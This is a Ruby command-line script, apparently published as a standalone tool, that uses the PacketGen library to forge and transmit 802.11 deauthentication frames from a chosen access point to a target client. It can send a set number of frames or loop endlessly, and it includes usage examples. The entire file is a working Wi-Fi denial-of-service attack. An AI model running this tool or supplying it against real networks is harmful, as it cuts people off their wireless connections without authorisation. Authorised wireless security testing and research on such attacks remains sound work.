require "packetgen"
require "optparse"
require "colorize"

puts "[~] Made by: @spooky_sec".colorize(:blue)

#clientaddr = "30:45:96:E8:3F:B3"
#bssid = "F4:4C:7F:9A:1E:44"
#iface = "wlan0mon"

if Process.euid != 0
  puts "[!] Please run this as root".colorize(:yellow)
  exit!
end

options = Hash.new
$err = false

def missing(msg)
  puts "[-] Missing #{msg}.".colorize(:red)
  $err = true
end

opts = OptionParser.new do |opts|
  opts.banner = "Usage: #{__FILE__} [options]"
  opts.on("-i", "--interface INTERFACE", "The network interface to use") do |v| #value
    options[:iface] = v
  end
  
  opts.on("-b", "--bssid MAC", "The MAC address of the AP") do |v|
    options[:bssid] = v
  end

  opts.on("-t", "--target MAC", "The target MAC address of the client device") do |v|
    options[:target] = v
  end

  opts.on("-c", "--count COUNT", Integer, "The amount of packets to send (0 for endless)") do |v|
    options[:count] = v
  end

  opts.on("-h", "--help", "Display this help screen") do
    puts opts
    exit!
  end

  opts.on_tail "\nExamples: "
  opts.on_tail "\t#{__FILE__} -b 00:11:22:33:44:55 -c 0 -t 55:44:33:22:11:00 -i wlan0mon"
end

begin
  opts.parse!
rescue OptionParser::InvalidArgument
  puts "[!] Count should be a number!".colorize(:yellow)
  exit!
rescue OptionParser::MissingArgument
  puts "[!] One or more arguemnts are missing a value!".colorize(:yellow)
  exit!
end

missing("BSSID") if options[:bssid].nil?
missing("COUNT") if options[:count].nil?
missing("TARGET") if options[:target].nil?
missing("INTERFACE") if options[:iface].nil?

if $err
  puts "[*] Use -h/--help for the help menu".colorize(:green)
  exit!
end

begin
  pkt = PacketGen.gen('RadioTap').
    add('Dot11::Management', mac1: options[:target], mac2: options[:bssid], mac3: options[:bssid]).
    add('Dot11::DeAuth', reason: 7)
rescue ArgumentError
  puts "[-] Please make sure your arguments are correct.".colorize(:red)
  exit!
end

begin
  if options[:count] == 0
    while true
      pkt.to_w(options[:iface])
      puts "[*] Deauth sent via: #{options[:iface]} to BSSID: #{options[:bssid]} for Client: #{options[:target]}".colorize(:green)
    end
  else
    options[:count].times do
      pkt.to_w(options[:iface])
      puts "[*] Deauth sent via: #{options[:iface]} to BSSID: #{options[:bssid]} for Client: #{options[:target]}".colorize(:green)
    end
  end
rescue PCAPRUB::PCAPRUBError
  puts "[-] Please make sure '#{options[:iface]}' is valid.".colorize(:red)
  exit!
end
